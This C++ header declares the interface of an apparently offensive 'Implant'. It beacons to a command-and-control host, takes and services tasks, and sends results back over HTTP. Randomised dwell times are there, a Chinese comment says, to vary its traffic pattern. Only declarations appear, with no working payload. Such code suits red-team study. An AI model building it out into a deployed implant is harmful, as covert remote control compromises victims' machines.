#pragma once

#define _SILENCE_CXX17_C_HEADER_DEPRECATION_WARNING

#include "tasks.h"

#include <string>
#include <string_view>
#include <mutex>
#include <future>
#include <atomic>
#include <vector>
#include <random>

#include <boost/property_tree/ptree.hpp>

struct Implant{
    // Our implant constructor
    //???
    Implant(std::string host, std::string port, std::string uri);
    // The thread for servicing tasks
    std::future<void> taskThread;
    // Our public functions that the implant exposes
    void beacon();
    void setMeanDwell(double meanDwell);
    void setRunning(bool isRunning);
    void serviceTasks();

private:
    const std::string host,port,uri;
    // Variables for implant config, dwell time and running status
    // 用指数分布（exponential_distribution）来产生可变的停留秒数
    // 确保通信pattern衡变
    std::exponential_distribution<double> dwellDistributionSeconds;
    std::atomic_bool isRunning;
    // Define our mutexes since we're doing async I/O stuff
    // 互斥锁mutex
    std::mutex taskMutex, resultsMutex;
    //property_tree是一个保存了多个属性值的树形数据结构，
    //可以用来解析xml、json、ini、info文件
    boost::property_tree::ptree results;
    std::vector<Task> tasks;
    // Generate random number
    std::random_device device;

    void parseTasks(const std::string& response);
    [[nodiscard]] std::string sendResults();
};

//take the host, port and URI as arguments along with the payload we want to send
[[nodiscard]] std::string sendHttpRequest(std::string_view host,
    std::string_view port,
    std::string_view uri,
    std::string_view payload);